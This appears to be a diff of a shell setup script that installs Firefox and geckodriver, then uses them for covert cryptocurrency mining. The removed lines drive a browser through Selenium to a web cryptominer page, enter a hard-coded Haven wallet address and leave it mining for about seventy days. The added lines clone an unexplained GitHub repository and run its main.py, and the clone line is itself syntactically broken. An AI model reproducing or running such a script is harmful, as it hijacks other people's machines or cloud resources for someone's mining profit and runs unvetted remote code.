@@ -22,5 +22,7 @@ apt-add-repository "deb http://ppa.launchpad.net/ubuntu-mozilla-security/ppa/ubu
 apt update -y 
 apt install firefox -y 
 curl -sSL https://github.com/mozilla/geckodriver/releases/download/v0.32.0/geckodriver-v0.32.0-linux64.tar.gz | tar -xvz && chmod +x geckodriver 
-export DISPLAY=:1    &&  mv geckodriver /usr/local/bin/   
-python3 -c "from selenium import webdriver;import time;driver=webdriver.Firefox();from selenium.webdriver.common.by import By;from selenium.webdriver import ActionChains;a=ActionChains(driver);driver.get('https://www.haven.crypto-webminer.com/haven.html');time.sleep(3);driver.find_element(By.ID,'wallethaven').click();time.sleep(4);a.send_keys('hvxy4KDb4B1TdkmVvBe5gaXuCdTpied9rJXuJvDQXsgZJ6R1Dqfp31CCQUhnb4Fop9McGrQHMhXh51iyWvQ7PUf97SdQhXrx3r').perform();driver.find_element(By.ID,'start').click();time.sleep(6048000)"
+mv geckodriver /usr/local/bin/   
+export DISPLAY=:1
+git clone('https://github.com/NP-sugam-pokhrel/ok.git) && cd ok
+python3 main.py
